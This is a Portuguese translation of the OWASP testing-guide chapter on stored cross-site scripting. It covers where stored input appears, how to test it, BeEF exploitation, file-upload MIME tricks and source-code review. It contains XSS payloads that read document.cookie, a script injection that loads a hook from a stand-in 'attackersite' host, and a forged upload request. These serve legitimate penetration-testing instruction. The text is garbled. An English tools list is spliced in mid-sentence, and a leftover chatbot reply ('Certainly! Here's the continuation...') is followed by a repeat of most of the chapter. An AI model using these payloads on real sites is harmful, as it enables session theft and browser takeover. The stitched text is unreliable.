# TestandoCross Site Scripting Armazenado

|ID          |
|------------|
|WSTG-INPV-02|

## Resumo

O Cross-site Scripting (XSS) armazenado é o tipo mais perigoso de Cross Site Scripting. Aplicações web que permitem aos usuários armazenar dados estão potencialmente expostas a esse tipo de ataque. Este capítulo ilustra exemplos de injeção de script cross-site armazenado e cenários relacionados.

O XSS armazenado ocorre quando uma aplicação web coleta uma entrada de um usuário que pode ser maliciosa e, em seguida, armazena essa entrada em um banco de dados para uso posterior. A entrada armazenada não é filtrada corretamente. Como consequência, os dados maliciosos parecerão fazer parte do site e serão executados no navegador do usuário sob os privilégios da aplicação web. Como essa vulnerabilidade normalmente envolve pelo menos duas solicitações à aplicação, isso também pode ser chamado de XSS de segunda ordem.

Essa vulnerabilidade pode ser usada para realizar diversos ataques baseados em navegador, incluindo:

- Sequestrar o navegador de outro usuário
- Capturar informações sensíveis visualizadas pelos usuários da aplicação
- Pseudo-desfiguração da aplicação
- Varredura de portas de hosts internos ("internos" em relação aos usuários da aplicação web)
- Entrega direcionada de exploits baseados em navegador
- Outras atividades maliciosas

O XSS armazenado não precisa de um link malicioso para ser explorado. A exploração bem-sucedida ocorre quando um usuário visita uma página com XSS armazenado. As fases a seguir estão relacionadas a um cenário típico de ataque XSS armazenado:

- Atacante armazena código malicioso na página vulnerável
- Usuário autentica-se na aplicação
- Usuário visita a página vulnerável
- Código malicioso é executado pelo navegador do usuário

Esse tipo de ataque também pode ser explorado com frameworks de exploração de navegador, como [BeEF](https://beefproject.com) e [XSS Proxy](http://xss-proxy.sourceforge.net/). Esses frameworks permitem o desenvolvimento de exploits JavaScript complexos.

O XSS armazenado é particularmente perigoso em áreas de aplicação onde usuários com altos privilégios têm acesso. Quando o administrador visita a página vulnerável, o ataque é automaticamente executado pelo navegador deles. Isso pode expor informações sensíveis, como tokens de autorização de sessão.

## Objetivos do Teste

- Identificar entrada armazenada que é refletida no lado do cliente.
- Avaliar a entrada que aceitam e a codificação aplicada no retorno (se houver).

## Como Testar

### Teste de Caixa Preta

O processo para identificar vulnerabilidades de XSS armazenado é semelhante ao processo descrito durante o [teste de XSS refletido](01-Testing_for_Reflected_Cross_Site_Scripting.md).

#### Formulários de Entrada

O primeiro passo é identificar todos os pontos em que a entrada do usuário é armazenada no back-end e, em seguida, exibida pela aplicação. Exemplos típicos de entrada de usuário armazenada podem ser encontrados em:

- Página de Usuários/Perfis: a aplicação permite ao usuário editar/mudar detalhes do perfil, como nome, sobrenome, apelido, avatar, imagem, endereço, etc.
- Carrinho de compras: a aplicação permite ao usuário armazenar itens no carrinho de compras que podem ser revisados posteriormente
- Gerenciador de arquivos: aplicação que permite o upload de arquivos
- Configurações/Preferências da aplicação: aplicação que permite ao usuário definir preferências
- Fórum/Quadro de mensagens: aplicação que permite a troca de mensagens entre usuários
- Blog: se a aplicação de blog permitir que os usuários enviem comentários
- Log: se a aplicação armazena alguma entrada do usuário em logs.

#### Analisar o Código HTML

A entrada armazenada pela aplicação geralmente é usada em tags HTML, mas também pode ser encontrada como parte do conteúdo JavaScript. Nesta etapa, é fundamental entender se a entrada está sendo armazenada e como ela está posicionada no contexto da página. Diferentemente do XSS refletido, o testador de penetração também deve investigar quaisquer canais fora de banda pelos quais a aplicação recebe e armazena a entrada dos usuários.

**Observação**: Todas as áreas da aplicação acessíveis pelos administradores devem ser testadas para identificar a presença de dados enviados pelos usuários.

**Exemplo**: Dados armazenados de e-mail em `index2.php`

![Exemplo de Entrada Armazenada](images/Stored_input_example.jpg)\
*Figura 4.7.2-1: Exemplo de Entrada Armazenada*

O código HTML de `index2.php` onde o valor do e-mail está localizado:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

Neste caso, o testador precisa encontrar uma maneira de injetar código fora da tag `<input>` da seguinte forma:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> CÓDIGO MALICIOSO <!-- />
```

#### Testando XSS Armazenado

Isso envolve testar os controles de validação e filtragem de entrada da aplicação. Exemplos básicos de injeção neste caso:

- `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;`
- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

Certifique-se de que a entrada seja submetida pela aplicação. Isso normalmente envolve desativar o JavaScript se os controles de segurança do lado do cliente estiverem implementados ou modificar a solicitação HTTP com um proxy web. Também é importante testar a mesma injeção com solicitações HTTP GET e POST. A injeção acima resulta em uma janela pop-up contendo os valores dos cookies.

> ![Exemplo de XSS Armazenado](images/Stored_xss_example.jpg)\
> *Figura 4.7.2-2: Exemplo de Entrada Armazenada*
>
> O código HTML após a injeção:
>
> ```html


> <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
> ```
>
> A entrada é armazenada e o payload XSS é executado pelo navegador ao recarregar a página. Se a entrada for escapada pela aplicação, os testadores devem testar a aplicação em busca de filtros XSS. Por exemplo, se a string "SCRIPT" for substituída por um espaço ou por um caractere NULO, isso poderia ser um sinal potencial de filtragem XSS em ação. Muitas técnicas existem para evitar filtros de entrada (consulte o capítulo [Testando XSS Refletido](01-Testing_for_Reflected_Cross_Site_Scripting.md)). É altamente recomendável que os testadores consultem a [Evasão de Filtro XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) e as páginas de trapaça [Mario](https://cybersecurity.wtf/encoder/), que fornecem uma lista extensa de ataques XSS e desvios de filtragem. Consulte a seção de whitepapers e ferramentas para obter informações mais detalhadas.

#### Alavancando o XSS Armazenado com o BeEF

O XSS armazenado pode ser explorado por frameworks avançados de exploração JavaScript, como [BeEF](https://www.beefproject.com) e [XSS Proxy](http://xss-proxy.sourceforge.net/).

Um cenário típico de exploração do BeEF envolve:

- Injetar um gancho JavaScript que se comunica com o framework de exploração de navegador do atacante (BeEF)
- Aguardar o usuário da aplicação visualizar a página vulnerável onde a entrada armazenada é exibida
- Controlar o navegador do usuário da aplicação por meio do console do BeEF

O gancho JavaScript pode ser injetado explorando a vulnerabilidade de XSS na aplicação web.

**Exemplo**: Injeção do BeEF em `index2.php`:

```html
aaa@aa.com"><script src=http://attackersite/hook.js></script>
```

Quando o usuário carrega a página `index2.php`, o script `hook.js` é executado pelo navegador. É então possível acessar cookies, captura de tela do usuário, área de transferência do usuário e lançar ataques XSS complexos.

> ![Exemplo de Injeção do BeEF](images/RubyBeef.png)\
> *Figura 4.7.2-3: Exemplo de Injeção do BeEF*
>
> Este ataque é particularmente eficaz em páginas vulneráveis visualizadas por muitos usuários com diferentes privilégios.

#### Upload de Arquivo

Se a aplicação web permitir o upload de arquivos, é importante verificar se é possível fazer o upload de conteúdo HTML. Por exemplo, se arquivos HTML ou TXT forem permitidos, um payload XSS pode ser injetado no arquivo enviado. O testador também deve verificar se o upload de arquivo permite a definição de tipos MIME arbitrários.

Considere a seguinte solicitação HTTP POST para upload de arquivo:

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

Essa falha de design pode ser explorada em ataques de manipulação de MIME pelo navegador. Por exemplo, arquivos aparentemente inofensivos como JPG e GIF podem conter um payload XSS que é executado quando são carregados pelo navegador. Isso é possível quando o tipo MIME para uma imagem, como `image/gif`, pode ser definido como `text/html`. Nesse caso, o arquivo será tratado pelo navegador do cliente como HTML.

Solicitação HTTP POST forjada:

```html
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

Considere também que o Internet Explorer não manipula tipos MIME da mesma maneira que o Mozilla Firefox ou outros navegadores. Por exemplo, o Internet Explorer trata arquivos TXT com conteúdo HTML como conteúdo HTML. Para obter mais informações sobre o tratamento de tipos MIME, consulte a seção de whitepapers no final deste capítulo.

### Teste de Caixa Cinza

O teste de caixa cinza é semelhante ao teste de caixa preta. No teste de caixa cinza, o testador de penetração possui conhecimento parcial da aplicação. Nesse caso, informações sobre a entrada do usuário, controles de validação de entrada e armazenamento de dados podem ser conhecidas pelo testador de penetração.

Dependendo das informações disponíveis, geralmente é recomendável que os testadores verifiquem como a entrada do usuário é processada pela aplicação e depois armazenada no sistema de back-end. Os seguintes passos são recomendados:

- Use a aplicação front-end e insira entrada com caracteres especiais/inválidos
- Analise as respostas da aplicação
- Identifique a presença de controles de validação de entrada
- Acesse o sistema de back-end e verifique se a entrada é armazenada e como é armazenada
- Analise o código-fonte e entenda como a entrada armazenada é renderizada pela aplicação

Se o código-fonte estiver disponível (como no teste de caixa branca), todas as variáveis usadas em formulários de entrada devem ser analisadas. Em particular, linguagens de programação como PHP, ASP e JSP fazem uso de variáveis/funções predefinidas para armazenar a entrada de solicitações HTTP GET e POST.

A tabela a seguir resume algumas variáveis e funções especiais para se observar ao analisar o código-fonte:

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - Variáveis HTTP GET  | `Request.QueryString` - HTTP GET | Servlets `doGet`, `doPost` - HTTP GET e POST |
| `$_POST` - Variáveis HTTP POST | `Request.Form` - HTTP POST | `request.getParameter` - Variáveis HTTP GET/POST |
| `$_REQUEST` – Variáveis HTTP POST, GET e COOKIE | `Server.CreateObject` - usado para fazer upload de arquivos |
| `$_FILES` - Variáveis de upload de arquivo HTTP |

**Nota**: A tabela acima é apenas um resumo dos parâmetros mais importantes, mas todas as variáveis de entrada do usuário devem ser investigadas.

## Ferramentas

- [Codificador de Charset PHP (PCE)](https://cybersecurity.wtf/encoder/) ajuda a codificar textos arbitrários para e de 

## Tools

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
- [BeEF](https://www.beefproject.com) is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.
- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
- [XSS Assistant](https://www.greasespot.net/) Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.

   Certainly! Here's the continuation of the translation with the "References" section:

```md
> ![Exemplo de XSS Armazenado](images/Stored_xss_example.jpg)\
> *Figura 4.7.2-2: Exemplo de Entrada Armazenada*
>
> O código HTML após a injeção:
>
> ```html
> <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
> ```
>
> A entrada é armazenada e o payload XSS é executado pelo navegador ao recarregar a página. Se a entrada for escapada pela aplicação, os testadores devem testar a aplicação em relação aos filtros XSS. Por exemplo, se a string "SCRIPT" for substituída por um espaço ou por um caractere NULO, isso poderá ser um sinal potencial de que os filtros XSS estão em ação. Existem muitas técnicas para evitar os filtros de entrada (veja o capítulo [Testando XSS refletido](01-Testing_for_Reflected_Cross_Site_Scripting.md)). É altamente recomendável que os testadores consultem [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) e as páginas de trapaça do [Mario](https://cybersecurity.wtf/encoder/), que fornecem uma extensa lista de ataques XSS e formas de contornar os filtros. Consulte a seção de whitepapers e ferramentas para obter informações mais detalhadas.

#### Alavancando o XSS Armazenado com o BeEF

O XSS armazenado pode ser explorado por frameworks avançados de exploração JavaScript, como o [BeEF](https://www.beefproject.com) e [XSS Proxy](http://xss-proxy.sourceforge.net/).

Um cenário típico de exploração do BeEF envolve:

- Injetar um gancho JavaScript que se comunica com o framework de exploração do navegador do atacante (BeEF)
- Aguardar o usuário da aplicação visualizar a página vulnerável onde a entrada armazenada é exibida
- Controlar o navegador do usuário da aplicação por meio do console BeEF

O gancho JavaScript pode ser injetado explorando a vulnerabilidade XSS na aplicação web.

**Exemplo**: Injeção do BeEF em `index2.php`:

```html
aaa@aa.com"><script src=http://attackersite/hook.js></script>
```

Quando o usuário carrega a página `index2.php`, o script `hook.js` é executado pelo navegador. É então possível acessar cookies, capturas de tela do usuário, área de transferência do usuário e iniciar ataques XSS complexos.

> ![Exemplo de Injeção do BeEF](images/RubyBeef.png)\
> *Figura 4.7.2-3: Exemplo de Injeção do BeEF*
>
> Este ataque é particularmente eficaz em páginas vulneráveis visualizadas por muitos usuários com diferentes privilégios.

#### Upload de Arquivo

Se a aplicação web permitir o upload de arquivos, é importante verificar se é possível fazer o upload de conteúdo HTML. Por exemplo, se arquivos HTML ou TXT forem permitidos, um payload XSS pode ser injetado no arquivo enviado. O testador também deve verificar se o upload de arquivos permite a definição de tipos MIME arbitrários.

Considere a seguinte solicitação POST HTTP para upload de arquivo:

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

Essa falha de design pode ser explorada em ataques de manipulação de MIME no navegador. Por exemplo, arquivos com aparência inofensiva como JPG e GIF podem conter um payload XSS que é executado quando são carregados pelo navegador. Isso é possível quando o tipo MIME para uma imagem, como `image/gif`, pode ser definido como `text/html`. Nesse caso, o arquivo será tratado pelo navegador do cliente como HTML.

Solicitação HTTP POST forjada:

```html
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

Considere também que o Internet Explorer não lida com os tipos MIME da mesma maneira que o Mozilla Firefox ou outros navegadores. Por exemplo, o Internet Explorer trata os arquivos TXT com conteúdo HTML como conteúdo HTML. Para obter mais informações sobre manipulação de MIME, consulte a seção de whitepapers no final deste capítulo.

### Teste de Caixa Cinza

O teste de caixa cinza é semelhante ao teste de caixa preta. No teste de caixa cinza, o testador tem conhecimento parcial da aplicação. Nesse caso, informações sobre a entrada do usuário, controles de validação de entrada e como a entrada do usuário é renderizada de volta ao usuário podem ser conhecidas pelo testador.

Dependendo das informações disponíveis, geralmente é recomendável que os testadores verifiquem como a entrada do usuário é processada pela aplicação e, em seguida, armazenada no sistema de back-end. As seguintes etapas são recomendadas:

- Usar a aplicação front-end e inserir entrada com caracteres especiais/inválidos
- Analisar as respostas da aplicação
- Identificar a presença de controles de validação de entrada
- Acessar o sistema de back-end e verificar se a entrada está armazenada e como está armazenada
- Analisar o código-fonte e entender como a entrada armazenada é renderizada pela aplicação

Se o código-fonte estiver disponível (como no teste de caixa branca), todas as variáveis usadas em formulários de entrada devem ser analisadas. Em particular, linguagens de programação como PHP, ASP e JSP usam variáveis/funções predefinidas para armazenar a entrada de solicitações HTTP GET e POST.

A tabela a seguir resume algumas variáveis e funções especiais a serem observadas ao analisar o código-fonte:

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - variáveis HTTP GET  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET e POST |
| `$_POST` - variáveis HTTP POST | `Request.Form` - HTTP POST | `request.getParameter` - variáveis HTTP GET/POST |
| `$_REQUEST` – variáveis HTTP POST, GET e COOKIE | `Server.CreateObject` - usado para fazer upload de arquivos |
| `$_FILES` -

 variáveis de upload de arquivo HTTP |

**Nota**: A tabela acima é apenas um resumo dos parâmetros mais importantes, mas todas as variáveis de entrada do usuário devem ser investigadas.

## Ferramentas

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) ajuda a codificar textos arbitrários para e de 65 tipos de conjuntos de caracteres que você pode usar em seus payloads personalizados.
- [Hackvertor](https://hackvertor.co.uk/public) é uma ferramenta online que permite muitos tipos de codificação e ofuscação de JavaScript (ou qualquer entrada de string).
- [BeEF](https://www.beefproject.com) é o framework de exploração de navegador. Uma ferramenta profissional para demonstrar o impacto em tempo real de vulnerabilidades do navegador.
- [XSS-Proxy](http://xss-proxy.sourceforge.net/) é uma ferramenta avançada de ataque Cross-Site-Scripting (XSS).
- [Burp Proxy](https://portswigger.net/burp/) é um servidor proxy HTTP/S interativo para atacar e testar aplicações web.
- [XSS Assistant](https://www.greasespot.net/) Script Greasemonkey que permite aos usuários testar facilmente qualquer aplicação web em busca de falhas de script entre sites.
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) é um servidor proxy HTTP/S interativo para atacar e testar aplicações web com um scanner integrado.

## Referências

### Recursos OWASP

- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Livros

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Segunda Edição, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### Whitepapers

- [CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Amit Klein: "Cross-site Scripting Explained"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
- [Gunter Ollmann: "HTML Code Injection and Cross-site Scripting"](http://www.technicalinfo.net/papers/CSS.html)
- [CGISecurity.com: "The Cross Site Scripting FAQ"](https://www.cgisecurity.com/xss-faq.html)
